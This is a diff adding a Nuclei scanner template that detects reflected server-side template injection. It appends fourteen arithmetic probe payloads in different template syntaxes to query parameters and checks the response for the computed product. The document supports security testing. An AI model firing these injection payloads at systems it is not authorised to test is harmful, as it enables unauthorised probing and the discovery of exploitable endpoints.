@@ -1,0 +1,55 @@
+id: reflection-ssti
+
+info:
+  name: Reflected SSTI Arithmetic Based
+  author: pdteam
+  severity: medium
+  reference:
+    - https://github.com/zaproxy/zap-extensions/blob/2d9898900abe85a47b9fe0ceb85ec39070816b98/addOns/ascanrulesAlpha/src/main/java/org/zaproxy/zap/extension/ascanrulesAlpha/SstiScanRule.java
+    - https://github.com/DiogoMRSilva/websitesVulnerableToSSTI#list-of-seversneeds-update
+  metadata:
+    max-request: 14
+  tags: ssti,dast
+
+variables:
+  first: "{{rand_int(1000, 9999)}}"
+  second: "{{rand_int(1000, 9999)}}"
+  result: "{{to_number(first)*to_number(second)}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    skip-variables-check: true
+    payloads:
+      ssti:
+        - '{{concat("${", "{{first}}*{{second}}", "}")}}'
+        - '{{concat("{{", "{{first}}*{{second}}", "}}")}}'
+        - '{{concat("<%=", "{{first}}*{{second}}", "%>")}}'
+        - '{{concat("{", "{{first}}*{{second}}", "}")}}'
+        - '{{concat("{{{", "{{first}}*{{second}}", "}}}")}}'
+        - '{{concat("${{", "{{first}}*{{second}}", "}}")}}'
+        - '{{concat("#{", "{{first}}*{{second}}", "}")}}'
+        - '{{concat("[[", "{{first}}*{{second}}", "]]")}}'
+        - '{{concat("{{=", "{{first}}*{{second}}", "}}")}}'
+        - '{{concat("[[${", "{{first}}*{{second}}", "}]]")}}'
+        - '{{concat("${xyz|", "{{first}}*{{second}}", "}")}}'
+        - '{{concat("#set($x=", "{{first}}*{{second}}", ")${x}")}}'
+        - '{{concat("@(", "{{first}}*{{second}}", ")")}}'
+        - '{{concat("{@", "{{first}}*{{second}}", "}")}}'
+
+    fuzzing:
+      - part: query
+        type: postfix
+        fuzz:
+          - "{{ssti}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{result}}"
+# digest: 4a0a00473045022100d708d1c94470ed6b8905dc03b2e87fd5408f31412d9cb8e002a271e13eae29ed02204c3c34ba3a148255d64a9513e36fe35a57032a0c9c5ede1d1c4d14d7813cc6c4:922c64590222798bb761d5b6d8e72950
